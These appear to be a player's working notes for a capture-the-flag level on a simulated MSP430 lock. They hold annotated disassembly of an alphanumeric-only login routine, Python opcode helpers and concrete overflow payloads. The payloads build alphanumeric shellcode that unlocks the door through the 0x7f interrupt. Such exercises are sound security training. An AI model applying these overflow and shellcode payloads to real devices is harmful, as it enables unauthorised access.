455e <login>
455e:  0b12           push	r11
4560:  3150 f0ff      add	#0xfff0, sp
4564:  3f40 7044      mov	#0x4470 "Enter the password to continue.", r15
4568:  b012 6046      call	#0x4660 <puts>
456c:  3f40 9044      mov	#0x4490 "Remember: passwords are between 8 and 16 characters.", r15
4570:  b012 6046      call	#0x4660 <puts>
4574:  3f40 c544      mov	#0x44c5 "Due to some users abusing our login system, we have", r15
4578:  b012 6046      call	#0x4660 <puts>
457c:  3f40 f944      mov	#0x44f9 "restricted passwords to only alphanumeric characters.", r15
4580:  b012 6046      call	#0x4660 <puts>

4584:  3e40 0002      mov	#0x200, r14
4588:  3f40 0024      mov	#0x2400, r15
458c:  b012 5046      call	#0x4650 <getsn> // Read password in length 0x200 to 0x2400

4590:  5f42 0024      mov.b	&0x2400, r15
4594:  0e43           clr	r14 // Index
4596:  7c40 0900      mov.b	#0x9, r12
459a:  7d40 1900      mov.b	#0x19, r13
459e:  073c           jmp	$+0x10 <login+0x50> // 0x45ae

# Copy next byte while alphanumeric
## Move bytes and increase index
45a0:  0b41           mov	sp, r11
45a2:  0b5e           add	r14, r11
45a4:  cb4f 0000      mov.b	r15, 0x0(r11) // move the byte in index i to the corespondig place on the stack
45a8:  5f4e 0024      mov.b	0x2400(r14), r15 // move the byte in index in memory to r15
45ac:  1e53           inc	r14
## First loop start
45ae:  4b4f           mov.b	r15, r11            // r11 is the byte to check
## If byte in 0-9
45b0:  7b50 d0ff      add.b	#0xffd0, r11        // -0x30
45b4:  4c9b           cmp.b	r11, r12			// if 0x9 >= (r11 - 0x30) --> byte in 0-9
45b6:  f42f           jc	$-0x16 <login+0x42> // Jump higer or same 0x45a0
## If byte in A-Z
45b8:  7b50 efff      add.b	#0xffef, r11        // -0x11
45bc:  4d9b           cmp.b	r11, r13            // if 0x19 >= (r11 - 0x41) --> byte in A-Z
45be:  f02f           jc	$-0x1e <login+0x42> // Jump higer or same 0x45a0
## If byte in a-z
45c0:  7b50 e0ff      add.b	#0xffe0, r11        // -0x20
45c4:  4d9b           cmp.b	r11, r13            // if 0x19 >= (r11 - 0x61) --> byte in a-z
45c6:  ec2f           jc	$-0x26 <login+0x42> // Jump higer or same 0x45a0
## Otherwise continue
45c8:  c143 0000      mov.b	#0x0, 0x0(sp)
45cc:  3d40 0002      mov	#0x200, r13
45d0:  0e43           clr	r14
45d2:  3f40 0024      mov	#0x2400, r15
45d6:  b012 8c46      call	#0x468c <memset> // Delete the password with zero

45da:  0f41           mov	sp, r15
45dc:  b012 4644      call	#0x4446 <conditional_unlock_door>
45e0:  0f93           tst	r15
45e2:  0324           jz	$+0x8 <login+0x8c>
45e4:  3f40 2f45      mov	#0x452f "Access granted.", r15
45e8:  023c           jmp	$+0x6 <login+0x90>
45ea:  3f40 3f45      mov	#0x453f "That password is not correct.", r15
45ee:  b012 6046      call	#0x4660 <puts>
45f2:  3150 1000      add	#0x10, sp
45f6:  3b41           pop	r11
45f8:  3041           ret

# Problems
1. Unlock door require 0x7f which is not alphanumeric
2. <INT> is at 0x45fc -> 0xfc is not number	
3. The stack address can be alphanumeric we just need to find the proper shellcode to jump to

### Spam ###
CMP R6,R5        ; Is R5 >= R6? Info to C
JHS Label2       ; Yes, C = 1

### Op code research ###

0 ='0x30'
9 ='0x39'
A ='0x41'
Z ='0x5a'
a ='0x61'
z ='0x7a'

# Generate OpCodes
```python
import string
alphanumeric = string.ascii_letters + string.digits
res = ''
for i in alphanumeric:
    for j in alphanumeric:
        res += hex(ord(i))[-2:] + hex(ord(j))[-2:] + ' \n'
```

# Regs after ret
pc  443c  sp 4400  sr 0000  cg 0000
r04 0000 r05 5a08 r06 0000 r07 0000 
r08 0000 r09 0000 r10 0000 r11 0000 
r12 2600 r13 0000 r14 0000 r15 0000 

# Shellcode:
445c:  3012 7e00      push	#0x7f
4460:  b012 fc45      call	#0x45fc <INT>
Push and call can be eliminated using manipulating the stack
So I should be able to write:

45fc 7e00

45fc --> hex(0x7a66 * 2 + 0x5130) = 0x145fc

## Hex to ascii
```python
_hex = '3450667a3450667a3450305145454545454545454545'
print(bytes.fromhex(_hex).decode())
```
'A' * 0x11 + 'TF' + 'FD'
AAAAAAAAAAAAAAAAATFFDAAFD

### Final strategy
Use ret to jump to <getsn> 'TF' (Without push the address, we will use our stackZ)
Read the data to 'FD'
Write new shellcode which unlcok the door
	3012 7f00      push	#0x7f
	b012 fc45      call	#0x45fc <INT>
	30127f00b012fc45
Use getsn ret to jump to the shellcode (The seconed FD)
###


1. Shellcode start at 0x43ec
2. First ascii adress 0x4430 -> Should overwrite 0x44
3. Seconed ret address at 0x4400 (0x14 after shellcode stsart)
3. 'A' * 0x11 + '0D' + 'FD' + 'A'*0x2e + shellcode #*

AAAAAAAAAAAAAAAAA0DFDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<shellcode>
4. 
add #0x7a66, r4
add #0x7a66, r4
add #0x5130, r4
ret

add #0x7a66, r4
add #0x7a66, r4
add #0x5130, r4
mov.b	r5, r5
mov.b	r5, r5
mov.b	r5, r5
mov.b	r5, r5
mov.b	r5, r5
3450667a3450667a3450305145454545454545454545 -> 4Pfz4Pfz4P0QEEEEEEEEEE

4. AAAAAAAAAAAAAAAAA0DFDAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4Pfz4Pfz4P0Q0A
EEEEEEEE
443e
#
A*0x10 + '4PEG'
+
add #0x1111, sp
3150 1111
+
add.b #0x11, sp
7150 1100
+
ret
3041
+
pop	sp
3141
+
pop r4 - r9
3441 - 3941
+
add #0x1111, r9	
3950 1111
+
add #0x1111, r4	
3450 1111
+
add.b #0x1111, r4
7450 1100
+
add.b #0x1111, r4
7050 1100
-
mov r4, 0x0(sp)
8144
-
mov r4, 0x0(r9)
8944
-
mov r4, 0x0(r4)
8444
-
push r9
0912
-
push r4
0412
-
mov #0x1111, r5
3540 1111
-
mov #0x1111, r4
3440 1111
-
mov r15, &0x1111
824f 1111
-
pop	r11
3b41
-
mov	@sp, sp
2141
-
mov	@r15, r14
2e4f
-
mov	@r15, sp
214f
-
add #0x1111, &sp
b250 1111
-
mov sp, &0x1111
8241 1111
-
inc	r11
1b53
-
inc	r14
1e53
-
add #0x1111, &0x2400
b250 1111 0024
-
mov #0x1111, sp
3140 1111
-
mov #0x1111, &0x2400
b240 1111 0024
-
add #0x1111, r11
3b50 1111
-
add #0x1111, r12
3c50 1111
-
add #0x1111, r13
3d50 1111
-
add #0x1111, r14
3e50 1111
-
add #0x1111, r15
3f50 1111
-
add.b #0x11, r11
7b50 1100
-
add.b #0x11, r12
7c50 1100
-
add.b #0x11, r13
7d50 1100
-
add.b #0x11, r14
7e50 1100
-
add.b #0x11, r15
7f50 1100


